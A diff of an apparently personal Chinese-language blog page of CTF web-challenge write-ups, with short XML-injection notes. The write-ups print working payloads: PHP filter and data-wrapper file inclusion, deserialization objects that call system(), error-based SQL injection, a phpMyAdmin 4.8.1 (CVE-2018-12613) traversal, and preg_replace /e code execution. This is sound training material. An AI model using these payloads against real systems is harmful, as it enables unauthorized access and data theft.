+<price>30.00</price>                                  <!--book的子元素-->
+</book>                                                 <!--book的结束-->
+</bookstore>                                       <!--bookstore的结束-->
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。   
+基本语法：
 
-<p>然后    上传后会显示uploads/后面一长串解析这串再带个index.php 就可以打开flag了</p>
-<p><strong>[ZJCTF 2019]NiZhuanSiWei 1</strong>  点进去就给了源码 需要get text file password text需要有welcome to the zjctf<br>利用data协议绕过</p>
-<p>将welcome to the zjctf写入</p>
-<p>而data://协议允许读入</p>
-<p>payload：</p>
-<p>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=<br>file=php://filter/read=convert.base64-encode/resource=useless.php （用这个来读取指定的文件 之前 <strong>[极客大挑战 2019]Secret File 1 和[ACTF2020 新生赛]Include 1 这俩有用到这个代码</strong>）然后把浏览器回显的东西base64解码一下<br>&lt;?php  </p>
-<p>class Flag{  //flag.php<br>    public $file;<br>    public function __tostring(){<br>        if(isset($this-&gt;file)){<br>            echo file_get_contents($this-&gt;file);<br>            echo “<br>“;<br>        return (“U R SO CLOSE !///COME ON PLZ”);<br>        }<br>    }<br>}<br>?&gt;    <strong>嚯哦又是反序列化</strong><br>构造&lt;?php  </p>
-<p>class Flag{  //flag.php<br>    public $file=’flag.php’;<br>    public function __tostring(){<br>        if(isset($this-&gt;file)){<br>            echo file_get_contents($this-&gt;file);<br>            echo “<br>“;<br>        return (“U R SO CLOSE !///COME ON PLZ”);<br>        }<br>    }<br>}<br>$a = new Flag(‘flag’);<br>var_dump(serialize($a));<br>?&gt;    然后丢给phpstudy 解析一下O:4:“Flag”:1:{s:4:“file”;s:8:“flag.php”;}  得到这个<br>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:“Flag”:1:{s:4:“file”;s:8:“flag.php”;}  三者结合就可以得到flag了<br><strong>[极客大挑战 2019]HardSQL  1</strong>也是过滤了一堆 union 之类的 发现如and/空格/union/select/=//<strong>/等都被过滤了</strong>但是有错误回显 报错注入**<br>‘^extractvalue(1,concat(0x7e,(select(database()))))%23 （爆库名）<br>‘^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’))))%23 （表）<br>#语句主要用()绕过了空格，用like绕过了=号<br>‘^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’))))%23 （列）<br>‘^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23<br>#这里要注意！select aaa from table_bbb;不需要引号！！！！！   可是只显示了flag其中的一段。 剩下的用right()显示其他位数的<br>‘^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))%23  就<strong>疯狂改数字 然后拼凑</strong></p>
+<p>所有 XML 元素都须有关闭标签。<br>XML 标签对大小写敏感。<br>XML 必须正确地嵌套。<br>XML 文档必须有根元素。<br>XML 的属性值须加引号。<br>若多个字符都需要转义，则可以将这些内容存放到CDATA里面</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/5.PNG?raw=true" alt="5.PNG"></p>
+<p>XML的设计宗旨是<strong>传输数据</strong>，而非显示数据。<br>XML注入前提条件<br>（1）用户能够控制数据的输入<br>（2）程序有拼凑的数据</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/6.PNG?raw=true" alt="6.PNG"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/03/page-45/" data-id="ckrosnlug000umow7bafxhd68" data-title="刷题3" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/07/08/page-63/" data-id="ckrosnlup0017mow73b4i5si8" data-title="NCTF2019fakeXMLcookbook" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-62" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/08/page-62/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:52:03.000Z" itemprop="datePublished">2021-07-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/08/page-62/">GWCTF 2019我有一个数据库  1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>还挺大胆直接告诉人你有一个<strong>数据库 url后/phpmyadmin 跳到php后台了</strong><br>然后看这版本4.8.1 <strong>有个漏洞叫（CVE-2018-12613）</strong> 可以远程文件包含漏洞<br>$target_blacklist = array (<br>    ‘import.php’, ‘export.php’<br>);</p>
+<p>// If we have a valid target, let’s load that script instead<br>if (! empty($_REQUEST[‘target’])<br>    &amp;&amp; is_string($_REQUEST[‘target’])<br>    &amp;&amp; ! preg_match(‘/^index/‘, $_REQUEST[‘target’])<br>    &amp;&amp; ! in_array($_REQUEST[‘target’], $target_blacklist)<br>    &amp;&amp; Core::checkPageValidity($_REQUEST[‘target’])<br>) {<br>    include $_REQUEST[‘target’];<br>    exit;<br>}<br>满足5个条件后就会include$_REQUEST[‘target’]的内容</p>
+<p>$_REQUEST[‘target’]不为空<br>$_REQUEST[‘target’]是字符串<br>$_REQUEST[‘target’]不以index开头<br>$_REQUEST[‘target’]不在$target_blacklist中 ‘import.php’, ‘export.php’<br>然后接下去的原理就看不懂了<br>任意文件包含<br>通过目录穿越包含任意文件 ?target=db_datadict.php%253f/../../../../../../../../../Windows/DATE.ini   这波这个payload就可以直接用了<br>?target=db_datadict.php%253f/../../../../../../../../../flag   /../ 这个慢慢加加到出现flag即可</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-62/" data-id="ckrosnluo0016mow72zmu8ovh" data-title="GWCTF 2019我有一个数据库  1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-61" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/08/page-61/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:52:01.000Z" itemprop="datePublished">2021-07-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/08/page-61/">BJDCTF2020ZJCTF，不过如此  1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>先用php伪协议 读取next.php  获得的代码<br>text=data://text/plain;base64,aWhhdmVhZHJlYW0=(文本内容ihaveadream的base64)&amp;file=php://filter/read=convert.base64-encode/resource=next.php</p>
+<p>base64解码一下得到如下</p>
+<?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+    @eval($_GET['cmd']);
+}
+**考preg_replace()的RCE**
+https://xz.aliyun.com/t/2557
+这篇文章就是讲这个的利用的
+\S*()={${eval($_POST[a])}}
+a=system%28%27cat+%2Fflag%27%29%3B
+preg_replace()的RCE
+payload 为：
+
+ /?.*={${phpinfo()}}，
+
+
+即 GET 方式传入的参数名为 /?.* ，值为 {${phpinfo()}}
+
+payload2:
+
+\S*=${phpinfo()}
+payload:利用源码给的getFlag函数
+
+/next.php?\S*=${getflag()}&cmd=show_source(%22/flag%22);   在next.php下可以执行这个操作
+                                                    system('cat/flag');  这个不知道为什么不行看有的wp可以成功
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-61/" data-id="ckrosnluo0015mow7hl4a7kw0" data-title="BJDCTF2020ZJCTF，不过如此  1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-59" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/08/page-59/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:51:57.000Z" itemprop="datePublished">2021-07-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/08/page-59/">BJDCTF2020Mark loves cat</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <?php
+include 'flag.php';
+$yds = "dog";
+$is = "cat";
+$handsome = 'yds';
+
+foreach($_POST as $x => $y){
+    $$x = $y;
+}
+
+foreach($_GET as $x => $y){              //通过post方式传递$flag=flag，最终结果为$$flag=flag    这便是POST方式处理代码
+    $$x = $$y;
+}
+
+foreach($_GET as $x => $y){
+    if($_GET['flag'] === $x && $x !== 'flag'){              //通过get传递yds=flag 得到$yds=$flag  
+        exit($handsome);
+    }
+}
+
+if(!isset($_GET['flag']) && !isset($_POST['flag'])){                          //get和post中不存在flag参数便退出程序输出$yds变量，得到flag 
+    exit($yds);
+}
+
+if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
+    exit($is);
+}
+
+echo "the flag is: ".$flag;"    //这是index.php 的源码
+**根据$$和foreach可以判断可能存在变量覆盖漏洞**，也就是可以将$yds，$is，$handsome的值进行覆盖成$flag变量，然后输出对应变量的值，获取flag。
+例如代码第17-19行，需要get传参?flag=flag，才能进入if语句中输出$handsome，但是foreach中并不能将$flag赋值给$handsome然后输出，所以此处无法利用。
+扫描**目录找到 .git 泄露** 
+**然后githack 把源码下下来**
+发现就两个重要文件，flag.php，读取flag文件内容并赋值给$flag:
+index.php，开头有个包含，在最后有个输出flag
+ if(!isset($_GET['flag']) && !isset($_POST['flag'])){
+    exit($yds);
+ }   发现get和post中不存在flag参数便退出程序输出$yds变量 
+传递如下参数 ：
+get: yds=flag
+post: $flag=flag
+
+那么最终payload  **?yds=flag**
+         **              post: $flag=flag**
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-59/" data-id="ckrosnlun0014mow777teeyf0" data-title="BJDCTF2020Mark loves cat" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-58" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/08/page-58/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:44:25.000Z" itemprop="datePublished">2021-07-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/08/page-58/">网鼎杯 2020 朱雀组phpweb</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>主页这边抓包发现 func=date&amp;p=Y-m-d+h%3Ai%3As+a  这句话这边可以传参 </p>
+<p>func=file_get_contents&amp;p=index.php  然后给了一堆的源码</p>
+<?php
+$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");       ；这边func可以用的功能被禁用了一大堆就很烦 但是反序列化可以
+function gettime($func, $p) {
+    $result = call_user_func($func, $p);
+    $a= gettype($result);
+    if ($a == "string") {
+        return $result;
+    } else {return "";}
+}
+class Test {
+    var $p = "Y-m-d h:i:s a";
+    var $func = "date";
+    function __destruct() {
+        if ($this->func != "") {
+            echo gettime($this->func, $this->p);
+        }
+    }
+}
+$func = $_REQUEST["func"];
+$p = $_REQUEST["p"];
+
+if ($func != null) {
+    $func = strtolower($func);
+    if (!in_array($func,$disable_fun)) {
+        echo gettime($func, $p);
+    }else {
+        die("Hacker...");
+    }
+}
+?>
+
+<p>虽然被禁用了一大堆但是还有反序列化可以用  func=unserialize&amp;p=index.php</p>
+<?php
+class Test {
+    var $p = "ls";
+    var $func = "system";
+    function __destruct() {
+        if ($this->func != "") {
+            echo gettime($this->func, $this->p);
+        }
+    }
+}
+
+$a=new Test();
+echo serialize($a);    
+
+贴一下构造的序列化代码构造这个生成O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";} 
+
+payload1
+
+ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}   获得文件列表
+
+func=unserialize&p=O:4:"Test":2:{s:1:"p";s:14:"ls ../../../..";s:4:"func";s:6:"system";}  然后给了更多
+
+
+
+但是你丫的怎么没有flag ┗|｀O′|┛
+
+![wwwwww.png](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/wwwwww.png?raw=true)
+
+**知识点：寻找flag文件常用命令小结：**
+system(‘ls’) : 列举当前目录下的所有文件
+system(“find / -name flag*”)：查找所有文件名匹配flag*的文件
+system(“cat $(find / -name flag*)”)：打印所有文件名匹配flag*的文件
+
+那么这个p就得变成p=cat $(find / -name flag*)
+
+func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"func";s:6:"system";}  最终payload
+
+![weww.png](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/weww.png?raw=true)
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-58/" data-id="ckrosnlun0013mow75h238ep6" data-title="网鼎杯 2020 朱雀组phpweb" class="article-share-link">Share</a>
       
       
       
@@ -580,7 +759,7 @@ public function isValidBlog ()
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -612,23 +791,23 @@ public function isValidBlog ()
       <ul>
         
           <li>
-            <a href="/2021/08/06/page-99/">HITCON 2017SSRFme</a>
+            <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
           </li>
         
           <li>
-            <a href="/2021/08/06/page-98/">网鼎杯 2018Comment</a>
+            <a href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
           </li>
         
           <li>
-            <a href="/2021/08/06/page-97/">CSCCTF 2019 QualFlaskLight</a>
+            <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
           </li>
         
           <li>
-            <a href="/2021/08/06/page-96/">ciscn2021 cyberpunck</a>
+            <a href="/2021/08/13/page-107/">SUCTF 2019EasyWeb</a>
           </li>
         
           <li>
-            <a href="/2021/08/06/page-95/">CISCN2019 总决赛 Day2 Web1Easyweb</a>
+            <a href="/2021/08/13/page-106/">WUSTCTF2020CV Maker</a>
           </li>
         
       </ul>
